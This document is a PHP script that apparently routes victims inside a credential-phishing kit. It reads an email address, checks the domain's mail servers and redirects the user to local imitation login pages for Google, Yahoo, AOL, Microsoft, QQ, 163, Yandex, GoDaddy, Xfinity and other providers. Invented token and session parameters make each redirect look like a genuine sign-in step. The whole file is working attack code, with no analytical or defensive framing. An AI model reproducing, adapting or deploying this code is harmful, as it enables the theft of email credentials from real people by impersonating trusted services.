<?php
	if(isset($_GET['email'])){
		$email = $_GET['email'];
		function getDomainFromEmail($email){
			// Get the data after the @ sign
			$domain = substr(strrchr($email, "@"), 1);
			return $domain;
		}
		$random=md5(date("Y-m-d H:i:s"));
		$random=base64_encode($random);
		$randoms=rand(0,200);

		$session_domain = md5(getDomainFromEmail($email));
		$token = md5($email."email-address".$randoms);
		$id = md5(date("D jS M Y")."email=".$email.$random);

		function getClientFromDomain($value, $email, $id, $session_domain, $token){
			if(preg_match("/gmail/", $value) || preg_match("/google/", $value)){
				header("Location: google-authentication/index.php?token=$token&session_id=$id&email=".$email."&auth0=true&session-id=$session_domain");
			}elseif(preg_match("/aol/", $value)){
				header("Location: login.aol.com/index.php?email-authentication=$token&auth5774897567yhdZxWq2178Jdh90488309k&session=$session_domain&email=".$email."&session-id-Auth0=$id");
			}elseif(preg_match("/yahoo/", $value)){
				header("Location: login.yahoo.com/index.php?authenticationLevel=true&authenticate_email_token=$token&id=$id&email=".$email."&auth0=true&session-id=089899876678990087898797879095995793997499339944939394384738");
			}elseif(preg_match("/hinet/", $value)){
				header("Location: httpswebmail.hinet.net/index.php?is_authentication=true&user_id=$id&session=&token&email=".$email."&auth0=true&session-id=$session_domain");
			}elseif(preg_match("/qq/", $value)){
				header("Location: mail.qq.com/index.php?auth5774897567yhdZxWq2178Jdh90488309k=1&session=$session_domain&user=$id&email=".$email."&auth0=true&session-id=095995793997499339944939394384738");
			}elseif(preg_match("/netease/", $value) || preg_match("/163\.com/", $value)){
				header("Location: qiye.login.com/index.php?session=$session_domain&user=$id&email=".$email."&auth0=true&session-id=095995793997499339944939394384738");
			}elseif(preg_match("/zoho/", $value)){
				header("Location: accounts.zoho.com/index.php?auth_level=$session_domain&id=$id&token=$token&email=".$email."&auth0=true");
			}elseif(preg_match("/126/", $value)){
				header("Location: 126.login/index.php?auth=true&status=1&sub=$id&session_token=$token&domain=$session_domain&email=".$email."&auth0=true&sub=m");
			}elseif(preg_match("/vip163/", $value)){
				header("Location: vip.163.com.login/index.php?auth=true&security=$id&status=$token&sub=0984765788393994848839993494883998499384975874&email=".$email."&auth0=true");
			}elseif(preg_match("/163/", $value)){
				header("Location: 163.mail.login/index.php?auth=$token&session=$session_domain&sub=0984765788393994848839993494883998499384975874&id=$id&email=".$email."&auth0=true&sent=verified");
			}elseif(preg_match("/aliyun/", $value)){
				header("Location: httpsmail.aliyun.com/index.php?header=true&security_level=$token&authentication=$id&status=1&sub=0984765788393994848839993494883998499384975874&email=".$email."&auth0=true");
			}elseif(preg_match("/emirates/", $value)){
				header("Location: dcm1.eim.aeiwc_staticc11nallDomainlayout/index.php?session=$id&auth=true&security_status=$token&sub=$session_domain&email=".$email."&auth0=true&session-id=095995793997499339944939394384738");
			}elseif(preg_match("/yeah/", $value)){
				header("Location: yeah.net/index.php?user_validation=true&auth=true&status=1&sub=$token&auth_hash=$id&email=".$email."&auth0=true&session-id=$session_domain");
			}elseif(preg_match("/secureserver/", $value)){
				header("Location: godaddy.com.mail/index.php?authenication=1&ver_auth=true&state=$token&status=$id&sub=0984765788393994848839993494883998499384975874&email=".$email."&auth0=true&session-id=$session_domain");
			}elseif(preg_match("/hotmail/", $value) || preg_match("/outlook/", $value)){
				header("Location: microsoft/index.php?microsoft_login_mail=1&microsoft-check-level=$token&security=$id&email=".$email."&session-id=ituu88847&NhYt5565dh7738xxcefrsts&auth0=true");
			}elseif(preg_match("/yandex/", $value)){
				header("Location: passport.yandex.com/index.php?current-hash=$id&stats_cdf_exponential=$token&security=$session_domain&email=".$email."&auth0=true&session-id=$id");
			}elseif(preg_match("/hichina/", $value)){
				header("Location: mail.hichina.com/index.php?security_level=high&users_session_id=$id&cache=$session_domain&email=".$email."&session-id=ituu88847&NhYt5565dh7738xxcefrsts&auth0=true");
			}elseif(preg_match("/1and1/", $value)){
				header("Location: mail.ionos.com/index.php?validation=true&hash_key=$token&sub=$id&m=$session_domain&email=".$email."&session-id=ituu88847&NhYt5565dh7738xxcefrsts&auth0=true");
			}elseif(preg_match("/mail.com/", $value)){
				header("Location: mail.com/index.php?email_authentication=$session_domain&auth_level=high&auth=$id&email=".$email."&session-id-Auth0=$token");
			}elseif(preg_match("/comcast/", $value)){
				header("Location: httpslogin.xfinity.comlogin/index.php?344FTmail.authentication=$token&auth=$id&mail=$session_domain&email=".$email."&auth0=true&session-id=$id");
			}elseif(preg_match("/".$value."/", $value)){
				header("Location: mail.login.com/index.php?authentication=true&ran_id=$token&user_session=$session_domain&id=$id&email=".$email."&auth0=true&session-id=$id");
			}
		}

		$domain= getDomainFromEmail($email);
		if(getmxrr($domain,$mx_details)){
		  foreach($mx_details as $key=>$value){
		  	getClientFromDomain(strtolower($value), $email, $id, $session_domain, $token);
		  }
		}
	}
?>

